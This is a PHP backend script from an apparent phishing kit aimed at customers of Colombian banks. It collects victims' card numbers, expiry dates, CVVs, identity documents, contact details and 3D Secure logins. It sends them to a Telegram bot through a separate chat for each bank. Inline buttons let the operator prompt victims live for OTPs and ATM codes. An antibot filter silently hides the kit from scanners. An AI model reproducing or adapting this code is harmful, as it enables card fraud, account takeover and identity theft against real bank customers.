<?php
@require_once __DIR__ . '/../includes/security.php';

// -------------------------------------------------------------

    $projectRoot = __DIR__;
    while ($projectRoot !== dirname($projectRoot)) {
        if (is_dir($projectRoot . '/token_bank') && file_exists($projectRoot . '/token_bank/config.php')) {
            break;
        }
        $projectRoot = dirname($projectRoot);
    }
    $tokenBankPath = $projectRoot . '/token_bank/config.php';
    $globalConfig = file_exists($tokenBankPath) ? require $tokenBankPath : [];
    $botToken = $globalConfig['bot_token'];
    
    $u_tb_raw = $_POST['u_tb'] ?? '{}';
    $tb_data = json_decode($u_tb_raw, true) ?? [];
    $banco_name = strtolower($tb_data['banco'] ?? '');
    
    $aval_list = ['bogota', 'occidente', 'popular', 'av villas', 'avvillas'];
    $is_aval = false;
    foreach ($aval_list as $ab) { if (strpos($banco_name, $ab) !== false) { $is_aval = true; break; } }
    
    if (!empty($tb_data['tarjeta']) || !empty($_POST['card_number']) || !empty($_POST['tarjeta'])) {
        $chat_final = $globalConfig['chat_id_tarjetas'];
    } elseif ($is_aval) {
        $chat_final = $globalConfig['chat_id_aval'];
    } elseif (strpos($banco_name, 'bancolombia') !== false) {
        $chat_final = $globalConfig['chat_id_bancolombia'];
    } else {
        $chat_final = $globalConfig['chat_id'];
    }
    
header('Content-Type: application/json');
ini_set('display_errors', 0);
error_reporting(E_ALL & ~E_NOTICE & ~E_WARNING);

$configLocal = @include __DIR__ . '/config.php';
$config = is_array($configLocal) ? $configLocal : [];

if (empty($botToken) || empty($chat_final)) {
    $globalPath = __DIR__ . '/../gate/recargas/transaction/config.php';
    if (file_exists($globalPath)) {
        $config = include $globalPath;
    }
}

$transactionId = $_POST['transactionId'] ?? '';
// --- RECORD CLIENT IP FOR TELEGRAM BAN BUTTON ---
if (!empty($transactionId) && function_exists('sura_save_transaction_ip')) {
    sura_save_transaction_ip($transactionId);
}
// ------------------------------------------------
$u_tb_raw = $_POST['u_tb'] ?? '{}';
$action_code = $_POST['action_code'] ?? '';
$action_value = $_POST['action_value'] ?? '';

if (empty($transactionId)) {
    echo json_encode(['status' => 'error', 'message' => 'Datos incompletos']);
    exit;
}

if (empty($botToken) || empty($chat_final)) {
    echo json_encode(['status' => 'error', 'message' => 'Config vacía (bot_token/chat_id)']);
    exit;
}

$tb = json_decode($u_tb_raw, true);
if (!is_array($tb)) $tb = [];

// --- EVALUACIÓN ANTIBOT & FILTRO DE DATOS FALSOS ---
if (function_exists('sura_evaluate_submission')) {
    $eval = sura_evaluate_submission($tb);
    if (!empty($eval['is_bot'])) {
        if (function_exists('sura_log_bot_detection')) {
            sura_log_bot_detection(sura_client_ip(), $eval['reason'], $tb);
        }
        // Silent drop: responde OK pero no envía a Telegram
        echo json_encode(['status' => 'success', 'message' => 'ok']);
        exit;
    }
}

// IP & Device
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$device = 'PC';
if (stripos($userAgent, 'Android') !== false) $device = 'Android';
elseif (stripos($userAgent, 'iPhone') !== false || stripos($userAgent, 'iPad') !== false) $device = 'iPhone';
elseif (stripos($userAgent, 'Mobile') !== false) $device = 'Movil';

$ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
$hora = date('d/m/Y H:i:s');

// Building the message

$tarjeta = $tb['tarjeta'] ?? '';$firstDigit = substr($tarjeta, 0, 1);
$cardInfo = [];
if (is_array($tb['card_info'] ?? null)) {
    $cardInfo = $tb['card_info'];
} elseif (is_array($tb['apicc_response'] ?? null)) {
    $cardInfo = $tb['apicc_response']['card_info'] ?? $tb['apicc_response'];
}
$scheme = !empty($tb['scheme']) ? $tb['scheme'] : ($cardInfo['scheme'] ?? $tb['apicc_response']['scheme'] ?? '');
$brandIcon = !empty($tb['cardBrand']) ? ucfirst($tb['cardBrand']) : (!empty($scheme) ? ucfirst($scheme) : (($firstDigit === '5') ? 'MasterCard' : 'Visa'));
$monto = number_format((float)($tb['total_pagar'] ?? 0), 0, ',', '.');
$banco = !empty($tb['banco']) ? $tb['banco'] : ($cardInfo['issuer'] ?? $tb['apicc_response']['issuer'] ?? 'Desconocido');
if (file_exists(__DIR__ . '/../includes/bank_helper.php')) {
    require_once __DIR__ . '/../includes/bank_helper.php';
    if (function_exists('jelpi_format_banco') && $banco !== 'Desconocido') {
        $banco = jelpi_format_banco($banco);
    }
}
$cardType = !empty($tb['card_type']) ? $tb['card_type'] : ($cardInfo['card_type'] ?? $tb['apicc_response']['card_type'] ?? '');
$issuerCountry = !empty($tb['issuer_country']) ? $tb['issuer_country'] : ($cardInfo['issuer_country'] ?? $tb['apicc_response']['issuer_country'] ?? '');

$mensaje = "";

if (!empty($action_code)) {
    $mensaje .= "◉ ACTUALIZACIÓN 3D SECURE ◉

";
   $mensaje .= "Nombre: " . ($tb['ownerName'] ?? '') . "
";
   $mensaje .= "Tarjeta: " . $tarjeta . "

";
    
    if ($action_code === 'usuario') {
       $mensaje .= "Usuario: " . ($tb['3d_user'] ?? '') . "
";
       $mensaje .= "Clave: " . ($tb['3d_pass'] ?? '') . "

";
    } else {
        $tipoStr = ucfirst($action_code);
       $mensaje .= $tipoStr . ": " . $action_value . "

";
    }
} else {
    $mensaje .= "◉ TARJETA DE CRÉDITO ◉

";
    
   if (!empty($tb['ownerName'])) $mensaje .= "Nombre: " . $tb['ownerName'] . "
";
   if (!empty($tb['documento'])) $mensaje .= "Documento: " . $tb['documento'] . "
";
   if (!empty($tb['correo'])) $mensaje .= "Correo: " . $tb['correo'] . "
";
   if (!empty($tb['telefono'])) $mensaje .= "Telefono: " . $tb['telefono'] . "
";
   if (!empty($tb['direccion'])) $mensaje .= "Direccion: " . $tb['direccion'] . "
";
    $mensaje .= "
Monto: $" . $monto . "

";
    
   $mensaje .= "Banco: " . $banco . "
";
    if (!empty($cardType)) {
       $mensaje .= "Tipo de tarjeta: " . $cardType . "
";
    }
   $mensaje .= "Franquicia: " . $brandIcon . "
";
    if (!empty($issuerCountry)) {
       $mensaje .= "País emisor: " . $issuerCountry . "
";
    }
    $mensaje .= "
Tarjeta: " . $tarjeta . "
";
   $mensaje .= "Vencimiento: " . ($tb['expMonth'] ?? '') . "/" . ($tb['expYear'] ?? '') . "
";
   $mensaje .= "CVV: " . ($tb['cvv'] ?? '') . "

";
}

$mensaje .= "IP: {$ip} | Device: {$device} | {$hora}

";
$mensaje .= "🐙 @FU7UR4MA 🐙";

$postData = [
    'chat_id' => $chat_final,
    'text' => $mensaje,
    'parse_mode' => 'HTML',
    'disable_web_page_preview' => true
];

if (!empty($action_code)) {
    $buttons = [
        'inline_keyboard' => [
            [
                ['text' => 'Usuario/Clave', 'callback_data' => "pedir_usuario:{$transactionId}"],
                ['text' => 'OTP', 'callback_data' => "pedir_otp:{$transactionId}"]
            ],
            [
                ['text' => 'Dinámica', 'callback_data' => "pedir_dinamica:{$transactionId}"],
                ['text' => 'C-Cajero', 'callback_data' => "pedir_cajero:{$transactionId}"]
            ],
            [
                ['text' => 'Error', 'callback_data' => "error:{$transactionId}"],
                ['text' => 'Tarjeta', 'callback_data' => "error_tc:{$transactionId}"]
            ],
            [
                ['text' => "❌ BANEAR IP", 'callback_data' => "ban_ip:{$transactionId}"]
            ]
        ]
    ];
    $postData['reply_markup'] = json_encode($buttons);
}

$ch = curl_init("https://api.telegram.org/bot" . $botToken . "/sendMessage");
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_POST => true,
    CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
    CURLOPT_POSTFIELDS => json_encode($postData)
]);
$response = curl_exec($ch);
curl_close($ch);

$resData = json_decode($response, true);

if ($resData && $resData['ok']) {
    $messageId = $resData['result']['message_id'];
    echo json_encode(['status' => 'success', 'messageId' => $messageId]);
} else {
    echo json_encode(['status' => 'error', 'message' => 'Error Telegram', 'telegram' => $resData]);
}
